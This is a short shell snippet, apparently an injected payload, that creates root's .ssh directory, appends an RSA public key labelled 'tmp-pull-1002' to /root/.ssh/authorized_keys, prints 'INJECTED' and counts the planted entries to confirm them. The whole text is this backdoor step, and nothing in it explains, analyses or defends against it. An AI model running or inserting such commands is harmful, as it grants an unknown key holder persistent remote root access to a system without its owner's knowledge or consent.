
mkdir -p /root/.ssh && chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
grep -q tmp-pull-1002 /root/.ssh/authorized_keys || echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYj2Wsftj/dzAT+WvXiML8ZJ3v9c8x+L3uT2mA0unbjeu6TTBF83YbVq1PAHr9mlQ9SRX/etCkqVqb3mdM1olp415PwTKJC3bohaybfPR+tvN9vfHbyaUWy6tq+wY5D2AIK9Mh7YT/ItzhbyepjSKc2T5mx+qy3m3BH+O5542W8ibdfiDAyISceEireTzVa4K3ktuvOcUNcFBEwDPDFYwh+cm56OQorSM4KuE2nIb0wKKBQj5IRoX8pmbwTLvoigTfB88DJf86Bd46ysn4S9tSdpDX18jVyAq2nWxLScnXN9BSg/8YkqIoufkcSsQ9TG0D+Km8kVUg/jX85hrOAHnX tmp-pull-1002" >> /root/.ssh/authorized_keys
echo INJECTED
grep -c tmp-pull-1002 /root/.ssh/authorized_keys
